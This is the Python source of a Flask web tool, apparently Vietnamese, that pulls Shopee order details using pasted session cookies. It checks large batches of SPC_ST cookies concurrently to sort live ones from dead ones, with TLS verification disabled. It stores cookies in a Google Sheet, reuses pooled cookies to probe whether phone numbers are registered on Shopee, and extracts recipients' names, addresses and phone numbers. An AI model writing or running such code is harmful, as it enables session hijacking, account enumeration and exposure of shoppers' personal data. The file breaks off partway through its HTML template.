# app.py
# -*- coding: utf-8 -*-
from flask import Flask, request, render_template_string, Response, jsonify
import requests, re, csv, io, json, os, random
from collections import deque
from datetime import datetime
from dotenv import load_dotenv
from flask import request, jsonify
import re

# ========= Load env (local). Trên Vercel dùng dashboard =========
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("APP_SECRET_KEY", "devkey")

# ========= Shopee API config =========
UA   = "Android app Shopee appver=28320 app_type=1"
BASE = "https://shopee.vn/api/v4"
SHOPEE_FP = os.getenv("SHOPEE_FINGERPRINT", "")
ERROR_OK = 10013           # Shopee error = 10013 → số chưa đăng ký
POST_TIMEOUT = 8           # timeout cho check_unbind

# ======= Cookie pool (đọc từ Google Sheet) =======
PRIMARY_POOL_SIZE = 3      # lấy tối đa 3 cookie: 1 chính + 2 dự phòng

# ========= Google Sheets config =========
GS_SCOPES   = ["https://www.googleapis.com/auth/spreadsheets"]
GS_SHEET_ID = os.getenv("GOOGLE_SHEET_ID", "")
GS_TAB      = os.getenv("GOOGLE_SHEET_TAB", "Cookie")
GS_CREDS    = os.getenv("GOOGLE_SHEETS_CREDS_JSON", "")

# Lazy import cho serverless
_gspread = None
_Credentials = None

def gs_config_ok() -> bool:
    return bool(GS_SHEET_ID and GS_CREDS)

def _gs_client():
    """Khởi tạo gspread client từ Service Account JSON trong ENV."""
    global _gspread, _Credentials
    if _gspread is None or _Credentials is None:
        import gspread
        from google.oauth2.service_account import Credentials
        _gspread = gspread
        _Credentials = Credentials
    data = json.loads(GS_CREDS)
    creds = _Credentials.from_service_account_info(data, scopes=GS_SCOPES)
    return _gspread.authorize(creds)

def _append_rows(rows):
    """
    Append nhiều dòng (List[List[str]]) vào tab – Ở đây là 1 cột Cookie.
    Nếu chưa cấu hình hoặc lỗi -> im lặng (không hiển thị lên UI).
    """
    if not rows or not gs_config_ok():
        return
    try:
        gc = _gs_client()
        sh = gc.open_by_key(GS_SHEET_ID)
        try:
            ws = sh.worksheet(GS_TAB)
        except _gspread.WorksheetNotFound:
            ws = sh.add_worksheet(title=GS_TAB, rows=5000, cols=1)
            ws.append_row(["Cookie"], value_input_option="RAW")
        ws.append_rows(rows, value_input_option="RAW")
    except Exception:
        pass  # im lặng

def _gs_read_live_cookies() -> list:
    """
    Đọc cột A (tab GS_TAB) -> list cookie đã lọc rác/trùng.
    Chỉ lấy tối đa PRIMARY_POOL_SIZE, xáo ngẫu nhiên.
    """
    if not gs_config_ok():
        return []
    try:
        gc = _gs_client()
        sh = gc.open_by_key(GS_SHEET_ID)
        ws = sh.worksheet(GS_TAB)
        col = ws.col_values(1) or []
    except Exception:
        return []

    if col and col[0].strip().lower() == "cookie":
        col = col[1:]

    seen, arr = set(), []
    for c in col:
        c = (c or "").strip()
        if not c:
            continue
        if "SPC_ST=" not in c and "=" not in c:
            continue
        if c in seen:
            continue
        seen.add(c)
        arr.append(c)

    random.shuffle(arr)
    return arr[:PRIMARY_POOL_SIZE]

# ================= HTTP =================
def build_headers(cookie: str) -> dict:
    return {
        "User-Agent": UA,
        "Cookie": cookie.strip(),
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

def http_get(url: str, headers: dict, params: dict | None = None, timeout: int = 20):
    try:
        r = requests.get(url, headers=headers, params=params, timeout=timeout)
        if "application/json" in (r.headers.get("Content-Type") or ""):
            return r.status_code, r.json()
        return r.status_code, {"raw": r.text}
    except requests.RequestException as e:
        return 0, {"error": str(e)}

def http_post_json(url: str, headers: dict, payload: dict, timeout: int = 20):
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=timeout)
        if "application/json" in (r.headers.get("Content-Type") or ""):
            return r.status_code, r.json()
        return r.status_code, {"raw": r.text}
    except requests.RequestException as e:
        return 0, {"error": str(e)}

# ================= JSON helpers =================
def find_first_key(data, key):
    dq = deque([data])
    while dq:
        cur = dq.popleft()
        if isinstance(cur, dict):
            if key in cur: return cur[key]
            dq.extend(v for v in cur.values() if isinstance(v, (dict, list)))
        elif isinstance(cur, list):
            dq.extend(x for x in cur if isinstance(x, (dict, list)))
    return None

def bfs_values_by_key(data, target_keys=("order_id",)):
    out, dq, tset = [], deque([data]), set(target_keys)
    while dq:
        cur = dq.popleft()
        if isinstance(cur, dict):
            for k, v in cur.items():
                if k in tset: out.append(v)
                if isinstance(v, (dict, list)): dq.append(v)
        elif isinstance(cur, list):
            dq.extend(cur)
    return out

def as_text(val):
    if isinstance(val, dict):
        return (val.get("text") or val.get("label") or val.get("value") or val.get("desc")
                or val.get("title") or val.get("subtitle") or val.get("sub_title")
                or val.get("tip") or val.get("tips"))
    if isinstance(val, list) and val:
        f = val[0]
        if isinstance(f, dict):
            return (f.get("text") or f.get("label") or f.get("value") or f.get("desc")
                    or f.get("title") or f.get("subtitle") or f.get("sub_title")
                    or f.get("tip") or f.get("tips"))
        if isinstance(f, str): return f
    return val

def normalize_image_url(s):
    if not isinstance(s, str) or not s: return None
    s = s.strip()
    if s.startswith("//"):       return "https:" + s
    if s.startswith("/file/"):   return "https://cf.shopee.vn" + s
    if s.startswith("http"):     return s
    if re.fullmatch(r"[A-Za-z0-9\-_]{20,}", s):
        return f"https://cf.shopee.vn/file/{s}"
    return s

def fmt_ts(ts):
    if isinstance(ts, str) and ts.isdigit():
        ts = int(ts)
    if isinstance(ts, (int, float)) and ts > 1_000_000:
        try:
            return datetime.fromtimestamp(int(ts)).strftime("%H:%M %d-%m-%Y")
        except Exception:
            return str(ts)
    return str(ts) if ts is not None else None
# ==== Status normalization helpers (add) ====
def normalize_status_text(status: str) -> str:
    """
    Bỏ tiền tố 'Tình trạng:' và emoji/khoảng trắng đầu dòng.
    """
    if not isinstance(status, str):
        return ""
    s = status.strip()
    s = re.sub(r"^tình trạng\s*:?\s*", "", s, flags=re.I)
    s = re.sub(r"^[\s\N{VARIATION SELECTOR-16}\uFE0F\U0001F300-\U0001FAFF]+", "", s)
    return s.strip()

def is_shopee_processing_text(status: str) -> bool:
    """
    True nếu là dạng 'Đơn hàng đang được xử lý bởi Shopee'
    (nhận cả tiếng Anh nếu có).
    """
    s = normalize_status_text(status).lower()
    return bool(
        re.search(r"đơn\s*hàng.*đang.*(được)?\s*xử lý.*shopee", s)
        or re.search(r"processing.*by.*shopee", s)
    )

# ================= Status map =================
# ================= Status map =================
# ================= Status map =================
CODE_MAP = {
    # ==== GIAO THÀNH CÔNG ====
    "order_status_text_to_receive_delivery_done": ("✅ Giao hàng thành công", "success"),
    "order_tooltip_to_receive_delivery_done":     ("✅ Giao hàng thành công", "success"),
    "label_order_delivered":                      ("✅ Giao hàng thành công", "success"),

    # ==== ĐANG CHỜ NHẬN ====
    "order_list_text_to_receive_non_cod":         ("🚚 Đang chờ nhận (không COD)", "info"),
    "label_to_receive":                           ("🚚 Đang chờ nhận", "info"),
    "label_order_to_receive":                     ("🚚 Đang chờ nhận", "info"),

    # ==== CHỜ GIAO HÀNG / SHOP XÁC NHẬN ====
    "label_order_to_ship":                        ("📦 Chờ giao hàng", "warning"),
    "label_order_being_packed":                   ("📦 Đang chuẩn bị hàng", "warning"),
    "label_order_processing":                     ("🔄 Đang xử lý", "warning"),

    # ==== THANH TOÁN / HỦY ====
    "label_order_paid":                           ("💰 Đã thanh toán", "info"),
    "label_order_unpaid":                         ("💸 Chưa thanh toán", "info"),
    "label_order_waiting_shipment":               ("📦 Chờ bàn giao vận chuyển", "info"),
    "label_order_shipped":                        ("🚛 Đã bàn giao vận chuyển", "info"),
    "label_order_delivery_failed":                ("❌ Giao không thành công", "danger"),
    "label_order_cancelled":                      ("❌ Đã hủy", "danger"),
    "label_order_return_refund":                  ("↩️ Trả hàng/Hoàn tiền", "info"),

    # ==== BỔ SUNG CHO SHOPEE & SHOP ====
    # Shopee xử lý / chưa tính ngày ship
    "order_list_text_to_ship_ship_by_date_not_calculated": ("🎖 Đơn hàng chờ Shopee duyệt", "warning"),
    "order_status_text_to_ship_ship_by_date_not_calculated": ("🎖 Đơn hàng chờ Shopee duyệt", "warning"),
    "label_ship_by_date_not_calculated": ("🎖 Đơn hàng chờ Shopee duyệt", "warning"),

# Shop đã duyệt, đang chuẩn bị giao
"label_preparing_order": ("📦 Chờ shop gửi hàng", "warning"),
"order_list_text_to_ship_order_shipbydate": ("📦 Chờ shop gửi hàng", "warning"),
"order_status_text_to_ship_order_shipbydate": ("📦 Người gửi đang chuẩn bị hàng", "warning"),   # <-- THÊM DÒNG NÀY
"order_list_text_to_ship_order_shipbydate_cod": ("📦 Chờ shop gửi hàng (COD)", "warning"),
"order_status_text_to_ship_order_shipbydate_cod": ("📦 Chờ shop gửi hàng (COD)", "warning"),

}


def map_code(code):
    if not isinstance(code, str): return None, "secondary"
    return CODE_MAP.get(code, (code, "secondary"))

# ================= Cancel helpers =================
def tree_contains_str(data, target: str) -> bool:
    if isinstance(data, dict):
        for v in data.values():
            if tree_contains_str(v, target): return True
    elif isinstance(data, list):
        for v in data:
            if tree_contains_str(v, target): return True
    elif isinstance(data, str):
        return data == target
    return False

def is_buyer_cancelled(detail_raw: dict) -> bool:
    d = detail_raw if isinstance(detail_raw, dict) else {}
    if tree_contains_str(d, "order_status_text_cancelled_by_buyer"):
        return True
    who = (find_first_key(d, "cancel_by") or find_first_key(d, "canceled_by") or
           find_first_key(d, "cancel_user_role") or find_first_key(d, "initiator") or
           find_first_key(d, "operator_role") or find_first_key(d, "operator"))
    if isinstance(who, dict): who = as_text(who)
    who_s = (str(who or "")).lower()

    reason = (find_first_key(d, "cancel_reason") or find_first_key(d, "buyer_cancel_reason") or
              find_first_key(d, "cancel_desc") or find_first_key(d, "cancel_description") or
              find_first_key(d, "reason"))
    if isinstance(reason, dict): reason = as_text(reason)
    reason_s = (str(reason or "")).lower()

    status_label = (as_text(find_first_key(d, "status_label")) or "").lower()
    is_cancel_status = ("cancel" in status_label) or ("hủy" in status_label) or ("cancel" in reason_s) or ("hủy" in reason_s)
    buyer_flags = ("buyer", "user", "customer", "người mua")
    if is_cancel_status and any(k in who_s or k in reason_s for k in buyer_flags): return True
    if "người mua" in reason_s and "hủy" in reason_s: return True
    return False

# ================= Fetch orders =================
def fetch_orders_and_details(cookie: str, limit: int = 50, offset: int = 0):
    headers = build_headers(cookie)
    list_url = f"{BASE}/order/get_all_order_and_checkout_list"
    _, data1 = http_get(list_url, headers, params={"limit": limit, "offset": offset})
    order_ids = bfs_values_by_key(data1, ("order_id",)) if isinstance(data1, dict) else []

    seen, uniq = set(), []
    for oid in order_ids:
        if oid not in seen:
            seen.add(oid); uniq.append(oid)

    details = []
    for oid in uniq[:limit]:
        detail_url = f"{BASE}/order/get_order_detail"
        _, data2 = http_get(detail_url, headers, params={"order_id": oid})
        details.append({"order_id": oid, "raw": data2})
    return {"details": details}

# ================= Timeline builder =================
TIME_KEYS   = ("time","ts","timestamp","ctime","create_time","update_time","event_time","log_time","happen_time","occur_time")
TEXT_KEYS   = ("text","status","description","detail","message","desc","label","note","title","subtitle","sub_title","tip","tips","name","content","status_text","event","event_desc","status_desc","detail_desc")
DRV_NAME_KS = ("driver_name","rider_name","courier_name","shipper_name","driver")
DRV_PHON_KS = ("driver_phone","rider_phone","courier_phone","shipper_phone","phone")
phone_re = re.compile(r"(?:\+?84|0)\d{8,10}")

def _pick_time(d):
    for k in TIME_KEYS:
        if isinstance(d, dict) and k in d and d[k] not in (None, "", []):
            return d[k]
    return None

def _deep_pick_text(obj):
    if isinstance(obj, dict):
        for k in TEXT_KEYS:
            v = obj.get(k)
            if isinstance(v, str) and v.strip(): return v.strip()
        for v in obj.values():
            t = _deep_pick_text(v)
            if t: return t
    elif isinstance(obj, list):
        for it in obj:
            t = _deep_pick_text(it)
            if t: return t
    elif isinstance(obj, str):
        s = obj.strip()
        if s: return s
    return None

def _pick_driver_line(d):
    name = None; phone = None
    if isinstance(d, dict):
        for k in DRV_NAME_KS:
            v = d.get(k)
            if isinstance(v, str) and v.strip():
                name = v.strip(); break
        for k in DRV_PHON_KS:
            v = d.get(k)
            if isinstance(v, str) and v.strip():
                phone = v.strip(); break
        if name or phone:
            return ("Tài xế: " + " ".join([name or "", phone or ""]).strip()).strip()
        for k in TEXT_KEYS:
            v = d.get(k)
            if isinstance(v, str) and (("tài xế" in v.lower()) or phone_re.search(v)):
                return "Tài xế: " + v.strip()
    return None

def _events_processing_info(d):
    out = []
    rows = find_first_key(d, "processing_info")
    if isinstance(rows, dict): rows = rows.get("info_rows")
    if not isinstance(rows, list): return out
    for r in rows:
        if not isinstance(r, dict): continue
        label = as_text(r.get("info_label"))
        v = r.get("info_value", {})
        ts = v.get("value") if isinstance(v, dict) else v
        if label == "label_odp_order_time": out.append((ts, "Đặt hàng thành công"))
        elif label == "label_odp_payment_time": out.append((ts, "Đã thanh toán"))
        elif label in ("label_odp_ship_time","label_odp_pack_time","label_odp_prepare_time"): out.append((ts, "Đang được chuẩn bị"))
        elif label in ("label_odp_bhandover_time","label_odp_handover_time"): out.append((ts, "Đã bàn giao cho đơn vị vận chuyển"))
        elif label in ("label_odp_transport_time","label_odp_delivery_time"): out.append((ts, "Đang vận chuyển"))
        elif label in ("label_odp_delivered_time","label_odp_delivery_done_time"): out.append((ts, "Giao hàng thành công"))
    return out

def _events_from_lists(obj):
    out = []
    def walk(o):
        if isinstance(o, dict):
            for v in o.values(): walk(v)
        elif isinstance(o, list):
            for it in o:
                if isinstance(it, dict):
                    ts = _pick_time(it) or _pick_time({"_": it})
                    txt = _deep_pick_text(it)
                    if txt and (ts is not None): out.append((ts, txt))
                    drv = _pick_driver_line(it)
                    if drv: out.append((ts, drv if ts is not None else None))
                walk(it)
    walk(obj)
    return out

def build_rich_timeline(d):
    raw = []
    raw += _events_from_lists(d)
    def walk_for_driver(o):
        if isinstance(o, dict):
            drv = _pick_driver_line(o)
            ts  = _pick_time(o)
            if drv: raw.append((ts, drv if ts is not None else None))
            for v in o.values(): walk_for_driver(v)
        elif isinstance(o, list):
            for it in o: walk_for_driver(it)
    walk_for_driver(d)
    raw += _events_processing_info(d)

    norm = []
    for tsv, txt in raw:
        if not isinstance(txt, str) or not txt.strip(): continue
        ts_out = None
        if isinstance(tsv, (int, float)): ts_out = int(tsv)
        elif isinstance(tsv, str) and tsv.isdigit(): ts_out = int(tsv)
        norm.append((ts_out, txt.strip()))
    if not norm: return None, None

    seen, uniq = set(), []
    for item in norm:
        if item in seen: continue
        seen.add(item); uniq.append(item)
    uniq.sort(key=lambda x: (10**15 if x[0] is None else x[0], x[1]))

    lines = []
    for ts_out, txt in uniq:
        ts_s = fmt_ts(ts_out) if ts_out is not None else None
        lines.append(f"{ts_s} — {txt}" if ts_s else txt)
    preview = " | ".join(lines[:2])
    html_out = "<br>".join(lines)
    return preview, html_out

# ================= Extract columns =================
def first_image(obj):
    for k in ("image","thumbnail","cover","img","picture"):
        v = find_first_key(obj, k)
        if isinstance(v, str): return normalize_image_url(v)
        if isinstance(v, list):
            for x in v:
                if isinstance(x, str): return normalize_image_url(x)
                if isinstance(x, dict):
                    for kk in ("url","image","thumbnail"):
                        u = x.get(kk)
                        if isinstance(u, str): return normalize_image_url(u)
    items = find_first_key(obj, "card_item_list") or find_first_key(obj, "items")
    if isinstance(items, list):
        for it in items:
            if isinstance(it, dict):
                for kk in ("image","thumbnail","cover","img"):
                    u = it.get(kk)
                    if isinstance(u, str): return normalize_image_url(u)
    return None

def first_tracking_number(obj):
    for k in ("tracking_number","tracking_no","tracking_num","trackingid","waybill","waybill_no","awb","billcode","bill_code","consignment_no","cn_number","shipment_no"):
        v = find_first_key(obj, k)
        if isinstance(v, str) and v.strip(): return v.strip()
    tinfo = find_first_key(obj, "tracking_info")
    if isinstance(tinfo, dict):
        t = tinfo.get("tracking_number") or tinfo.get("tracking_no")
        if isinstance(t, str) and t.strip(): return t.strip()
    return None

def build_status_text_and_color(d):
    """
    Trả (status_text, status_color).
    Ưu tiên mô tả từ tracking_info.description; nhận diện riêng:
      - Shopee đang xử lý
      - Đang chuẩn bị / chờ shop gửi hàng
      - Thành công / thất bại
    Sau đó mới fallback theo code/label trong payload.
    """
    # 1) Ưu tiên mô tả từ tracking_info
    tinfo = find_first_key(d, "tracking_info")
    if isinstance(tinfo, dict):
        desc = tinfo.get("description") or tinfo.get("text") or tinfo.get("status_text")
        if isinstance(desc, str) and desc.strip():
            desc_norm = normalize_status_text(desc)

            # Shopee đang xử lý
            if is_shopee_processing_text(desc):
                return "🎖 Shopee đang xử lý đơn", "info"

            dl = desc_norm.lower()

            # 'đang chuẩn bị / chờ shop gửi / người gửi đang chuẩn bị'
            if (
                re.search(r"(chuẩn|chuan)\s*bi.*h(à|a)ng", dl) or
                re.search(r"ch(ờ|o)\s*shop\s*g(ử|u)i", dl) or
                re.search(r"người\s*g(ử|u)i\s*đang\s*chuẩn\s*bị\s*h(à|a)ng", dl) or
                re.search(r"(prepar|packing|to\s*ship|ready\s*to\s*ship)", dl)
            ):
                return desc_norm, "warning"

            # Thất bại / huỷ
            if ("không" in dl or "fail" in dl or "failed" in dl or "unsuccess" in dl or "cancel" in dl):
                return desc_norm, "danger"

            # Thành công
            if (("giao hàng" in dl or "giao thành công" in dl or "delivered" in dl) and ("không" not in dl)):
                return desc_norm, "success"

            # Đang vận chuyển / đi đường
            if any(kw in dl for kw in ["đang vận chuyển", "đang giao", "in transit", "out for delivery"]):
                return desc_norm, "info"

            # Mặc định
            return desc_norm, "info"

    # 2) Fallback theo code/label trong payload
    status = find_first_key(d, "status") or {}
    if isinstance(status, dict):
        for code in [
            as_text(status.get("header_text")),
            as_text(status.get("list_view_text")),
            as_text(status.get("status_label")),
            as_text(status.get("list_view_status_label")),
        ]:
            if isinstance(code, str):
                # Nếu code nói 'processing' thì vẫn hiển thị rõ
                if "processing" in code.lower():
                    return "🎖 Shopee đang xử lý đơn", "info"
                t, c = map_code(code)
                if t:
                    return t, c

    code = as_text(find_first_key(d, "status_label")) or as_text(find_first_key(d, "list_view_status_label"))
    t, c = map_code(code)
    if isinstance(t, str) and is_shopee_processing_text(t):
        return "🎖 Shopee đang xử lý đơn", "info"
    return t, c

def extract_shop_info(d):
    username = None; shop_id = None
    si = find_first_key(d, "shop_info")
    if isinstance(si, dict):
        username = si.get("username") or username
        shop_id  = si.get("shop_id")  or shop_id
    return username, shop_id

def pick_columns_from_detail(detail_raw: dict) -> dict:
    d = detail_raw if isinstance(detail_raw, dict) else {}
    s = {}
    txt, col = build_status_text_and_color(d)
    s["status_text"]  = txt or "—"
    s["status_color"] = col or "secondary"

    rec_addr = find_first_key(d, "recipient_address") or {}
    if not isinstance(rec_addr, dict): rec_addr = {}
    s["shipping_address"] = find_first_key(d, "shipping_address") or rec_addr.get("full_address")
    s["shipping_name"]    = find_first_key(d, "shipping_name") or rec_addr.get("name") or find_first_key(d, "recipient_name")
    s["shipping_phone"]   = find_first_key(d, "shipping_phone") or rec_addr.get("phone")
    s["shipper_name"]     = find_first_key(d, "driver_name")
    s["shipper_phone"]    = find_first_key(d, "driver_phone")
    s["product_image"]    = normalize_image_url(find_first_key(d, "image")) or first_image(d)
    s["tracking_no"]      = first_tracking_number(d)
    s["shop_username"], s["shop_id"] = extract_shop_info(d)

    p, f = build_rich_timeline(d)
    s["timeline_preview"], s["timeline_full"] = p, f
    return s

# ========= Phone normalization =========
def normalize_phone_variants(s: str):
    """
    Chuẩn hoá input thành 3 biến thể: n9/phone0/phone84.
    Hỗ trợ: 0xxxxxxxxx | xxxxxxxxx | 84xxxxxxxxx | +84xxxxxxxxx
    """
    if not isinstance(s, str):
        return None
    digits = re.sub(r"\D+", "", s)
    if digits.startswith("84"):
        number9 = digits[2:11]
    elif digits.startswith("0"):
        number9 = digits[1:10]
    else:
        # nhập 9 số (bỏ số 0) -> lấy 9 số cuối
        number9 = digits[-9:]
    if len(number9) != 9 or not number9.isdigit():
        return None
    return {"n9": number9, "phone0": "0" + number9, "phone84": "84" + number9}

# ========= Shopee check_unbind (1 cookie/lần) =========
def _try_check_unbind_once(sess: requests.Session, cookie: str, phone84: str) -> tuple[bool, str]:
    """
    Gọi check_unbind_phone 1 lần với 1 cookie.
    Trả (ok, result_text):
      - ok=False  -> cookie die / lỗi mạng (hãy thử cookie dự phòng)
      - ok=True   -> đã nhận JSON; result_text: 'Số chưa đăng ký' | 'Số không dùng được'
    """
    url = "https://shopee.vn/api/v4/account/management/check_unbind_phone"
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Cookie": cookie.strip(),
    }
    payload = {"phone": phone84, "device_sz_fingerprint": SHOPEE_FP or ""}
    try:
        r = sess.post(url, headers=headers, json=payload, timeout=POST_TIMEOUT)
    except Exception:
        return (False, "Số không dùng được")

    if r.status_code in (401, 403, 429, 500, 502, 503, 504):
        return (False, "Số không dùng được")

    if "application/json" not in (r.headers.get("Content-Type") or ""):
        return (False, "Số không dùng được")

    try:
        j = r.json()
    except Exception:
        return (False, "Số không dùng được")

    err = j.get("error", 0)
    if isinstance(err, str) and err.isdigit():
        err = int(err)
    if err == ERROR_OK:
        return (True, "Số chưa đăng ký")
    return (True, "Số không dùng được")
#=====================Lọc Cookie SLl
# --- ADD: bulk cookie checker (fast) ---
from flask import request, jsonify
import httpx
import asyncio
import re

# Endpoint Shopee để *ping* nhanh (trả 401/403 nếu cookie die)
CHECK_URL = "https://shopee.vn/api/v4/account/get_account_info"

# tách 1 dòng cookie: loại bỏ khoảng trắng, giữ nguyên chuỗi cookie
COOKIE_LINE_RE = re.compile(r"\s+")

async def _check_one_cookie(client: httpx.AsyncClient, ck: str) -> str:
    if not ck.strip():
        return "die"
    headers = {
        "cookie": ck.strip(),
        "user-agent": "Mozilla/5.0",
        "accept": "application/json, text/plain, */*",
        "referer": "https://shopee.vn/",
    }
    try:
        r = await client.get(CHECK_URL, headers=headers, timeout=6)
        # 200 có data -> live; một số khi 200 nhưng empty cũng coi là live
        if r.status_code == 200:
            return "live"
        # 401 / 403 đa phần là die / hết hạn
        return "die"
    except Exception:
        return "die"

async def _check_many(cookies: list[str], concurrency: int = 40) -> list[str]:
    # concurrency cao để check nhanh (tùy server); chỉnh nếu cần
    limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency)
    async with httpx.AsyncClient(limits=limits, verify=False, follow_redirects=True) as client:
        sem = asyncio.Semaphore(concurrency)
        async def task(ck):
            async with sem:
                return await _check_one_cookie(client, ck)
        return await asyncio.gather(*[task(ck) for ck in cookies])

@app.post("/api/check-cookies")
def api_check_cookies():
    """
    Body JSON: { "cookies": ["ck1", "ck2", ...] }
    Return: { "results": ["live","die",...], "live_count": N, "die_count": M }
    """
    data = request.get_json(silent=True) or {}
    cookies = data.get("cookies") or []
    # làm sạch các dòng kiểu "   " 
    cookies = [COOKIE_LINE_RE.sub(" ", ck).strip() for ck in cookies if isinstance(ck, str) and ck.strip()]
    if not cookies:
        return jsonify({"results": [], "live_count": 0, "die_count": 0})

    results = asyncio.run(_check_many(cookies))
    live_count = sum(1 for s in results if s == "live")
    return jsonify({"results": results, "live_count": live_count, "die_count": len(results) - live_count})

# =================== UI TEMPLATE (FULL) ===================
TEMPLATE = """
<!doctype html>
<html lang="vi">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>MinSu - Tra cứu đơn hàng Shopee</title>
<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" />
<style>
:root{ --shopee:#EE4D2D; --ink:#1f2937; }
body{ background:#fff; color:var(--ink); font-size:14px; }
.zoom-80{ transform: scale(0.8); transform-origin: top center; }
.sh-header{ background:var(--shopee); color:#fff; padding:12px 0; box-shadow:0 2px 8px rgb(0 0 0 / 8%); }
.logo-bag{ width:36px; height:36px; border-radius:8px; background:#fff; color:var(--shopee); display:flex; align-items:center; justify-content:center; font-weight:800; margin-right:10px; }
.brand{ font-weight:800; letter-spacing:.2px; }
.card{ border:1px solid #f1f5f9; box-shadow:0 6px 20px rgb(17 24 39 / 6%); border-radius:16px; margin-bottom:16px; }

.mono{ font-family: ui-monospace, Menlo, Monaco, Consolas, "Courier New", monospace; }

/* Ảnh nhỏ */
img.product{ width:42px; height:42px; object-fit:cover; border-radius:8px; border:1px solid #f1f5f9; }

/* Badge nhỏ gọn */
.badge-wrap{ white-space: normal !important; display:inline-block; line-height:1.05; max-width:100%; font-size:12px; padding:.12rem .35rem; }

/* Bảng gọn (desktop) */
.table-fixed { table-layout: fixed; width:100%; }
.table-fixed th, .table-fixed td{
  vertical-align: middle;
  overflow: hidden;
  text-overflow: ellipsis;
  padding: .28rem .36rem;
  border-color: #eef2f7;
  font-size: 12.6px;
}
.table-fixed th{ white-space: nowrap; font-size:12px; }

/* Không xuống dòng */
.nowrap{ white-space: nowrap; }

/* Địa chỉ 1 dòng */
.addr-one{ white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

/* Khoảng cách giữa cột */
.table-fixed th:nth-child(2), .table-fixed td:nth-child(2){ padding-right:.18rem; }
.table-fixed th:nth-child(3), .table-fixed td:nth-child(3){ padding-left:.18rem; }

/* Nút icon gọn */
.btn-icon{ padding:.15rem .35rem; display:inline-flex; align-items:center; justify-content:center; }
.btn-icon i{ font-size:16px; }
/* Nút cam kiểu Shopee */
.btn-shopee{
  background:#EE4D2D; 
  color:#fff; 
  border-color:#EE4D2D;
}
.btn-shopee:hover,
.btn-shopee:focus{
  background:#ff5a36;
  border-color:#ff5a36;
  color:#fff;
}
/* === CTA Zalo chip (nhỏ, có mép vát) === */
.zalo-cta{ display:flex; justify-content:center; margin-top:12px; }
.zalo-chip{
  --h: 36px;                /* chiều cao chip - muốn nhỏ hơn thì giảm */
  --padx: 10px;             /* padding ngang phần chữ */
  display:inline-flex; align-items:center;
  height:var(--h); line-height:var(--h);
  text-decoration:none; user-select:none;
  border-radius:999px; overflow:hidden;
  box-shadow:0 4px 14px rgba(238,77,45,.16);
}
.zalo-chip .logo{
  width:var(--h); height:var(--h);
  display:inline-flex; align-items:center; justify-content:center;
  background:#fff;          /* nền trắng ôm logo */
}
.zalo-chip .label{
  position:relative;
  display:inline-flex; align-items:center;
  padding:0 var(--padx);
  background:#EE4D2D; color:#fff; font-weight:700; font-size:14px;
  white-space:nowrap;
}
/* mép vát nhỏ ở đầu label */
.zalo-chip .label::before{
  content:""; position:absolute; left:-8px; top:0; bottom:0;
  width:16px; background:#EE4D2D;
  transform:skewX(-22deg);
}
/* hover nhẹ */
.zalo-chip:hover{ filter:brightness(1.02); transform:translateY(-1px); transition:all .15s; }

/* size nhỏ hơn (tuỳ chọn): thêm class .is-sm vào .zalo-chip */
.zalo-chip.is-sm{ --h: 30px; --padx: 8px; font-size:13px; }

/* === CTA Chip tái sử dụng === */

.cta-chip{
  --h: 36px;                /* chiều cao */
  --padx: 10px;             /* padding ngang */
  display:inline-flex; align-items:center;
  height:var(--h); line-height:var(--h);
  text-decoration:none; user-select:none;
  border-radius:999px; overflow:hidden;
  box-shadow:0 4px 14px rgba(0,0,0,.08);
}
.cta-chip .logo{
  width:var(--h); height:var(--h);
  display:inline-flex; align-items:center; justify-content:center;
  background:#fff;
}
.cta-chip .label{
  position:relative;
  display:inline-flex; align-items:center;
  padding:0 var(--padx);
  font-weight:700; font-size:14px; white-space:nowrap;
}
.cta-chip .label::before{
  content:""; position:absolute; left:-8px; top:0; bottom:0;
  width:16px; transform:skewX(-22deg);
}
.cta-chip:hover{ filter:brightness(1.03); transform:translateY(-1px); transition:all .15s; }
.cta-chip.is-sm{ --h:30px; --padx:8px; font-size:13px; }

/* Biến thể Zalo */
.cta-zalo .label{ background:#EE4D2D; color:#fff; }
.cta-zalo .label::before{ background:#EE4D2D; }

/* Biến thể Grab */
.cta-grab .label{ background:#00A859; color:#fff; }
.cta-grab .label::before{ background:#00A859; }


/* ===== Modal (đổi sang cam Shopee) ===== */
.modal-header { background:#EE4D2D; color:#fff; }
.modal-header .btn-close { filter: invert(1); } /* icon nút đóng thành màu trắng */
.modal-content { border-radius: 14px; }
.badge-status { font-size:12px; }
</style>
</head>
<body>
<header class="sh-header">
  <div class="container d-flex align-items-center justify-content-between">
    <div class="d-flex align-items-center">
      <div class="logo-bag"><i class="bi bi-bag"></i></div>
      <div class="brand-wrap">
        <div class="brand">Min<span>Su</span></div>
        <div class="tagline">Tra cứu đơn hàng Shopee</div>
      </div>
    </div>
  </div>
</header>

<main class="container my-3">
  <!-- Form cookie -->
  <div class="card">
    <div class="card-body">
      <form method="POST">
        <label class="form-label fw-semibold">Dán nhiều cookie (mỗi dòng 1 cookie: SPC_ST=...)</label>
        <textarea id="cookieInput" class="form-control mono" name="cookies" rows="6"
  placeholder="SPC_ST=abc...
SPC_ST=xyz...
..." required>{{ cookies_text or '' }}</textarea>


       <!-- Buttons -->
       <div class="mt-2 d-flex flex-wrap gap-2">
         <button class="btn btn-primary btn-sm" type="submit" name="action" value="check">
           <i class="bi bi-search"></i> Check
         </button>
         <button class="btn btn-outline-success btn-sm" type="submit" name="action" value="export_live">
           <i class="bi bi-funnel"></i> Lọc Cookie Live
         </button>
         <button class="btn btn-outline-secondary btn-sm" type="submit" name="action" value="export_sheet">
           <i class="bi bi-table"></i> Xuất Google Sheet
         </button>
         <button class="btn btn-shopee btn-sm" type="button" data-bs-toggle="modal" data-bs-target="#checkPhoneModal">
           <i class="bi bi-telephone"></i> Check số Shopee
</button>





       </div>
      </form>
    </div>
  </div>

  {% if results %}
  <!-- Desktop/table view -->
  <div class="card d-none d-md-block">
    <div class="card-body">
      <div class="table-responsive">
